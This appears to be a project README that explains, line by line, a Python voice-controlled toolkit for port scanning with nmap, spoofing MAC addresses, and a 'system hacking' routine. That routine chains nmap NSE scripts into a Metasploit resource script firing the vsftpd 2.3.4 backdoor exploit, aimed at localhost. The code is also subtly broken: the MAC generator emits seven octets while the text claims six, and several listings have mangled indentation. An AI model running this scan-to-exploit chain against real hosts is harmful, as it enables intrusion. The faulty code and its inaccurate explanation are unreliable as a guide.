# Voice-Controlled-Cybersecurity-Toolkit-using-Python
This program integrates voice recognition, text-to-speech, and networking utilities to automate tasks such as scanning for open ports, changing MAC addresses, and running system exploitation commands

 It uses Python libraries pyttsx3 for speech synthesis, speech_recognition for recognizing spoken words, and subprocesses for running system commands. Below is a detailed explanation of each line of the program, followed by a formatted report.

1. Import Libraries:-
  import pyttsx3
  import subprocess
  import speech_recognition as sr
  import random
  pyttsx3: A text-to-speech library used to convert text into speech. It's initialized later to "speak" messages.

  subprocess: Used to run system-level commands like nmap, ifconfig, and msfconsole.

  speech_recognition: A library for recognizing speech and converting it into text.

  random: Used to generate random values, in this case for generating a random MAC address.

2. Text-to-Speech Initialization:

   engine = pyttsx3.init()
   Initializes the pyttsx3 engine, which will allow the program to speak using text-to-speech functionality.


3. Speech Recognizer Initialization:
   
   r = sr.Recognizer()
   Initializes the recognizer object from the speech_recognition library, which will listen to the microphone input.

4. Random MAC Address Generator:

   def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xFF) for _ in range(6))
   
  This function generates a random MAC address in the format 02:xx:xx:xx:xx:xx where each xx is a random hexadecimal number between 00 and FF.
  
5. Main Logic - Listening and Responding:

   with sr.Microphone() as source:
    print("Talk")
    audio_text = r.listen(source)
    print("Time over, thanks")

    This block captures audio input from the microphone. When you speak, it listens until there is a pause and then stops listening. It prints "Talk" to indicate       the start and "Time over, thanks" when it finishes listening.

6. Recognizing Speech:

   try:
    final = r.recognize_google(audio_text)
    print("Text: " + final)
    final = final.lower()
   This converts the audio input into text using Google’s speech recognition API. The recognized speech is printed and then converted to lowercase for easier          comparison.

7. Command Handling:

   if "start scanning" in final:
    engine.say("Starting network scan")
    engine.runAndWait()
    subprocess.run(['nmap', '127.0.0.1', '-p-'])

    If the recognized speech contains the phrase "start scanning", the program will use the pyttsx3 engine to say "Starting network scan". Then, it runs nmap to        scan all ports (-p-) on the local machine (127.0.0.1).

8. MAC Address Change:

   elif "mac change" in final:
    engine.say("Changing MAC address")
    engine.runAndWait()
    interface = "eth0"  # Change to your actual interface
    new_mac = random_mac()
    subprocess.run(['sudo', 'ifconfig', interface, 'down'])
    subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac])
    subprocess.run(['sudo', 'ifconfig', interface, 'up'])
    print(f"MAC address changed to {new_mac}")


    If the speech contains "mac change", the program tells the user "Changing MAC address". Then, it generates a random MAC address and changes the MAC address of       a network interface (like eth0). The program runs a series of system commands using ifconfig to disable the interface, change its MAC address, and enable it       again.

9. System Hacking:
    elif "system hacking" in final:
    engine.say("Starting full network enumeration and exploitation")
    engine.runAndWait()

    If the speech contains "system hacking", the program announces it’s starting a network enumeration and exploitation process.

10. Nmap Aggressive Scan:

     subprocess.run(['nmap', '-A', '-T4', '127.0.0.1', '-oN', 'nmap_full_scan.txt'])

     This command runs a comprehensive nmap scan on the local machine (127.0.0.1) to find open ports, services, and other information (-A for aggressive scanning, -    T4 for faster scans). The results are saved to a file called nmap_full_scan.txt.

11. Parsing Scan Results:

     services = []
     with open('nmap_full_scan.txt', 'r') as f:
     lines = f.readlines()
    for line in lines:
      if "/tcp" in line and "open" in line:
          print("[+] Open Port Line:", line.strip())
          parts = line.strip().split()
          if len(parts) >= 3:
              service = parts[2]
              services.append(service)

      This section reads the nmap_full_scan.txt file, identifies lines that contain open TCP ports, and extracts the service information (such as HTTP, FTP,             etc.). It collects these services for further processing.

12. Running NSE Scripts for Services:

    for service in services:
    print(f"[+] Running NSE script scan for: {service}")
    try:
        subprocess.run(['nmap', '--script', f'{service}-*', '127.0.0.1'])
    except Exception as e:
        print(f"[-] Error scanning with script for {service}: {e}")

    For each identified service, the program attempts to run nmap with a script to gather additional details or attempt exploitation. These scripts are specific       to the identified service.

13. Launching Metasploit for Exploitation:

    msf_script = '''
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 127.0.0.1
    set RPORT 21
    exploit
    '''
    with open("exploit.rc", "w") as f:
      f.write(msf_script)
    subprocess.run(['msfconsole', '-r', 'exploit.rc'])

    If the system exploitation command is triggered, the program writes a Metasploit script for a known vulnerability in vsftpd (a version of FTP software). This      script attempts to exploit the vulnerability using Metasploit. It runs the msfconsole tool to perform the exploit.

14. Error Handling:

     except sr.UnknownValueError:
        print("Could not understand audio")
       except sr.RequestError as e:
        print(f"Could not request results; {e}")

    If the speech recognition fails, it handles errors gracefully and informs the user about the issue (e.g., it could not understand the audio or the API request     failed).







